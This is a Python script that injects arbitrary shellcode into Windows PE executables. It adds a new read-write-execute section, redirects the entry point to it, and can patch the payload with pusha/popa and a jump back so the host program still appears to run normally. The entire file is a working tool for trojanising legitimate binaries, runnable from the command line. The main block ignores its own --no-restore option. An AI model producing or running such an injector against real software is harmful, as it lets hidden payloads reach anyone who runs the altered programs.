#!/usr/bin/env python3
import sys
from typing import List, Any
from argparse import ArgumentParser, Namespace
from pathlib import Path
from shutil import copy
from importlib import import_module
from prettytable import PrettyTable
from utils import shellcode_encoder
import mmap
from struct import pack
from pefile import PE


# Shoulders of Giants:
# - https://github.com/rmadair/PE-Injector/blob/master/pe-injector.py
# - https://axcheron.github.io/code-injection-with-python/#adding-the-section-header

# class SECTION_HEADER(Structure):
#     _fields_ = [
#         ("Name",                    BYTE * 8),
#         ("VirtualSize",             DWORD),
#         ("VirtualAddress",          DWORD),
#         ("SizeOfRawData",           DWORD),
#         ("PointerToRawData",        DWORD),
#         ("PointerToRelocations",    DWORD),
#         ("PointerToLinenumbers",    DWORD),
#         ("NumberOfRelocations",     WORD),
#         ("NumberOfLinenumbers",     WORD),
#         ("Characteristics",         DWORD)
#     ]

# Section Headers
# Name: contains the section name with a padding of null bytes if the size of the name is not equal to 8 bytes.
# VirtualSize: contains the size of the section in memory.
# VirtualAddress: contains the relative virtaul address of the section.
# SizeOfRawData: contains the size of the section on the disk.
# PointerToRawData: contains the offset of the section on the disk.
# Characteristics: contains the flags describing the section characteristics (RWX).

# Alignment (Optional Header)
# SectionAligment: section alignment in memory.
# FileAligment: section alignment on the disk.

RWE_CHARACTERISTIC = 0xE0000020


def align(val_to_align, alignment):
    return ((val_to_align + alignment - 1) // alignment) * alignment


def fix_shellcode(shellcode, jmp_dist) -> bytes:
    # \x60 = pusha, \x61 = popa, \xe9 = 32 bit relative distance
    pusha = b"\x60"
    popa = b"\x61"
    jmp = b"\xe9"
    jmp_to = pack("I", jmp_dist & 0xFFFFFFFF)
    return pusha + shellcode + popa + jmp + jmp_to


def change_entry_point(pe: PE) -> PE:
    # edit the entrypoint
    original_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    number_of_section = pe.FILE_HEADER.NumberOfSections
    created_section = pe.sections[number_of_section - 1]
    print(f"[*] New Last Section Name: {created_section.Name.decode()}")
    new_entry_point = created_section.VirtualAddress
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_entry_point
    print(
        f"[*] Original Entry Point: {original_entry_point:#0{10}x} - {original_entry_point}"
    )
    print(f"[*] New Entry Point: {new_entry_point:#0{10}x} - {new_entry_point}")
    pe.write()
    return pe


def inject_shellcode(pe: PE, shellcode: bytes) -> PE:
    number_of_section = pe.FILE_HEADER.NumberOfSections
    created_section = pe.sections[number_of_section - 1]
    raw_offset = created_section.PointerToRawData
    print(f"[*] Raw Offset for Injection: {raw_offset:#0{10}x} - {raw_offset}")
    print(f"[*] Writing shellcode to offset: {raw_offset:#0{10}x} - {raw_offset}")
    pe.set_bytes_at_offset(raw_offset, shellcode)
    return pe


# adds new section to the end of the PE file
def create_new_section(pe: PE, name: str, size: int, output: Path):
    if name[0] != ".":
        name = "." + name
    if len(name) > 8:
        print(f"Name '{name}' cannot be greater than 8 bytes")
        sys.exit(1)

    # set some variables
    number_of_section = pe.FILE_HEADER.NumberOfSections
    last_section = pe.sections[number_of_section - 1]
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
    print("[*] Number of Sections:", number_of_section)
    print(f"[*] File Alignment: {file_alignment:#0{10}x} - {file_alignment}")
    print(f"[*] Section Alignment: {section_alignment:#0{10}x} - {section_alignment}")

    # get virtual offset for the last real section
    virtual_offset = last_section.VirtualAddress + last_section.Misc_VirtualSize
    print(f"[*] Virtual Offset: {virtual_offset:#0{10}x} - {virtual_offset}")
    # get raw offset for the last real section
    raw_offset = last_section.PointerToRawData + last_section.SizeOfRawData
    print(f"[*] Raw Offset: {raw_offset:#0{10}x} - {raw_offset}")

    # now we can put the new section after the last, but we still need to consider alignment
    aligned_virtual_offset = align(virtual_offset, section_alignment)
    print(
        f"[*] Aligned Virtual Offset: {aligned_virtual_offset:#0{10}x} - {aligned_virtual_offset}"
    )

    aligned_raw_offset = align(raw_offset, file_alignment)
    print(
        f"[*] Aligned Raw Offset: {aligned_raw_offset:#0{10}x} - {aligned_raw_offset}"
    )

    # lets take our size of the new section, and align that as well
    aligned_virtual_size = align(size, section_alignment)
    print(f"[*] Aligned Virtual Size: {aligned_virtual_size}")
    aligned_raw_size = align(size, file_alignment)
    print(f"[*] Aligned Raw Size: {aligned_raw_size}")

    # 40 is size of section header, new_section_offset is where to write code to
    new_section_offset = last_section.get_file_offset() + 40

    # write the new section header
    name_padding_len = 8 - len(name.encode())
    bname = name.encode() + (name_padding_len * b"\x00")
    print(f"[*] New Section Name: {name}")
    print(f"[*] Padded Name Length: {len(bname)}")

    print(
        f"[*] New Section Offset: {new_section_offset:#0{10}x} - {new_section_offset}"
    )
    # Set the name
    print(f"[*] Writing name to {new_section_offset:#0{10}x} - {new_section_offset}")
    pe.set_bytes_at_offset(new_section_offset, bname)

    # Set the virtual size
    virt_size_dst = new_section_offset + 8
    pe.set_dword_at_offset(virt_size_dst, aligned_virtual_size)
    print(
        f"[*] Writing aligned virtual size to {virt_size_dst:#0{10}x} - {virt_size_dst}"
    )

    # Set the virtual offset
    virt_off_dst = new_section_offset + 12
    pe.set_dword_at_offset(virt_off_dst, aligned_virtual_offset)
    print(
        f"[*] Writing aligned virtual offset to {virt_off_dst:#0{10}x} - {virt_off_dst}"
    )

    # Set the raw size
    raw_size_dst = new_section_offset + 16
    pe.set_dword_at_offset(raw_size_dst, aligned_raw_size)
    print(f"[*] Writing aligned raw size to {raw_size_dst:#0{10}x} - {raw_size_dst}")

    # Set the raw offset
    raw_off_dst = new_section_offset + 20
    pe.set_dword_at_offset(raw_off_dst, aligned_raw_offset)
    print(f"[*] Writing aligned raw offset to {raw_off_dst:#0{10}x} - {raw_off_dst}")

    # Set the following fields to zero (don't know what these are)
    nothing_dst = new_section_offset + 24
    pe.set_bytes_at_offset(nothing_dst, (12 * b"\x00"))
    print(f"[*] Writing nothing to {nothing_dst:#0{10}x} - {nothing_dst}")

    # Set the characteristics
    char_dst = new_section_offset + 36
    pe.set_dword_at_offset(char_dst, RWE_CHARACTERISTIC)
    print(f"[*] Writing rwe characteristics to {char_dst:#0{10}x} - {char_dst}")

    # need to modify NumberOfSections, SizeOfImage
    _orginal_section_num = pe.FILE_HEADER.NumberOfSections
    pe.FILE_HEADER.NumberOfSections += 1
    print(
        f"[*] Increasing section number from {_orginal_section_num} to {pe.FILE_HEADER.NumberOfSections}"
    )
    _orginal_image_size = pe.OPTIONAL_HEADER.SizeOfImage
    _new_image_size = aligned_virtual_size + aligned_virtual_offset
    pe.OPTIONAL_HEADER.SizeOfImage = _new_image_size
    print(
        f"[*] Original SizeOfImage {_orginal_image_size:#0{10}x} - {_orginal_image_size}"
    )
    print(
        f"[*] New SizeOfImage {pe.OPTIONAL_HEADER.SizeOfImage:#0{10}x} - { pe.OPTIONAL_HEADER.SizeOfImage}"
    )
    print(f"[*] Writing changes to {str(output)}")
    pe.write(str(output))
    print(f"[*] Regenerating PE instance fo {str(output)}")
    return PE(str(output))


def create_injected_pe(
    shellcode: bytes, file: Path, output: Path, no_fix: bool
) -> bytes:

    # set some size variables
    shellcode_size = len(shellcode)
    if not no_fix:
        # at least 7 bytes are required for the fix
        shellcode_size += 8  # change this to something more accurate

    # section header is 40 bytes
    needed_section_size = shellcode_size + 40

    # delete output if exists
    if output.is_file():
        print("[*] Deleting old file")
        output.unlink()

    # copy the source file to the output file
    # expand the binary by the neede bytes (with alignment)
    print(f"[*] Copying {str(file)} to {str(output)}")
    copy(str(file), str(output))
    pe = PE(str(output))
    output = Path(str(output))
    # TODO: is alignment necessary or correct here?
    file_alignment = pe.OPTIONAL_HEADER.FileAlignment
    add_size = align(needed_section_size, file_alignment)
    print(
        f"[*] Expanding {output} by {needed_section_size} bytes with file alignment {file_alignment} for a total of {add_size} new bytes"
    )

    fd = open(str(output), "a+b")
    map = mmap.mmap(fd.fileno(), 0, access=mmap.ACCESS_WRITE)
    map.resize(output.stat().st_size + add_size)
    map.close()
    fd.close()

    original_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    print(
        f"[*] Original Entry Point: {original_entry_point:#0{10}x} - {original_entry_point}",
    )
    original_sections = pe.sections
    print(
        "[*] Original sections:",
        " ".join([s.Name.decode() for s in original_sections]),
        f"({len(original_sections)})",
    )

    # create the new section and write to output, returns a new pe instance of output
    print(f"[*] Creating new section '.extra' with {needed_section_size} bytes")
    target_pe = create_new_section(pe, ".extra", shellcode_size, output)

    print(
        "[*] New sections:",
        " ".join([s.Name.decode() for s in target_pe.sections]),
        f"({len(target_pe.sections)})",
    )
    target_pe = change_entry_point(target_pe)

    if not no_fix:
        print(f"[*] Getting Information to fix ShellCode")
        # based on original values
        original_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
        section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
        section = pe.get_section_by_rva(original_entry_point)
        remaining = section.VirtualAddress
        remaining += section.Misc_VirtualSize
        remaining -= original_entry_point
        print(f"[*] Remaining: {remaining:#0{10}x} - {remaining}",)
        end_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint + remaining
        print(f"[*] End RVA: {end_rva:#0{10}x} - {end_rva}",)
        padding = section_alignment
        padding -= end_rva % section_alignment
        print(f"[*] End RVA Padding: {padding:#0{10}x} - {padding}",)
        aligned_sc_offset = pe.get_offset_from_rva(end_rva + padding)
        print(
            f"[*] Aligned Shellcode Offset: {aligned_sc_offset:#0{10}x} - {aligned_sc_offset}",
        )
        # absolute distance from original entry point to
        jump_distance = original_entry_point - pe.get_rva_from_offset(aligned_sc_offset)
        print(f"[*] Jump Distance: {jump_distance:#0{10}x} - {jump_distance}")
        _jmp_to = jump_distance & 0xFFFFFFFF
        print(f"[*] Jump To: {_jmp_to:#0{10}x} - {_jmp_to}")
        print("[*] Fixing shellcode")
        shellcode = fix_shellcode(shellcode, jump_distance)

    print("[*] Injecting Shellcode")
    target_pe = inject_shellcode(target_pe, shellcode)
    print(f"[*] Writing injected PE to {str(output)}")
    target_pe.write(str(output))


def apply_parser(parser: ArgumentParser) -> ArgumentParser:
    parser.add_argument(
        "-s",
        "--shellcode",
        type=str,
        help="shellcode to convert in \\xAA\\xBB format (can also pass: a python import path via 'py:somefile.someimporttarget', shellcode in \\AA format in a file via 'txt:/path/to/file', and binary data in a file via 'bin:/path/to/binary')",
        required=True,
    )
    parser.add_argument(
        "-f", "--file", type=str, help="path to pe file", required=True,
    )
    parser.add_argument(
        "-o",
        "--output",
        type=str,
        help="path to newly created pe file",
        default="injected.exe",
    )
    parser.add_argument(
        "-F",
        "--force",
        action="store_true",
        help="force overwrite output",
        default=False,
    )
    parser.add_argument(
        "--no-restore",
        action="store_true",
        help="do not fix the payload with popa and pusha",
        default=False,
    )
    return parser


def normalize_args(args: Namespace) -> dict:
    items = vars(args)
    items["shellcode"] = shellcode_encoder(items["shellcode"])
    p_file = Path(items["file"])
    if not p_file.is_file():
        print(f"File not found at {items['file']}")
        sys.exit(1)
    items["file"] = p_file
    if items["output"] in ["stdout", "/proc/self/fd/1"]:
        print("Writing to stdout not supported")
        sys.exit(1)
    p_output = Path(items["output"])
    if p_output.is_file() and not items["force"]:
        print("Output file already exists. Delete it or use '--force' to overwrite")
        sys.exit(1)
    items["output"] = p_output
    return items


if __name__ == "__main__":
    parser = ArgumentParser(description="Inject shellcode into new section")
    parser = apply_parser(parser)
    args = normalize_args(parser.parse_args())
    options = {"should_restore": not args["no_restore"]}
    # manager = InjectManager(args["shellcode"], args["file"], args["output"], options)
    # manager.inject()
    create_injected_pe(args["shellcode"], args["file"], args["output"], True)
    sys.exit(0)
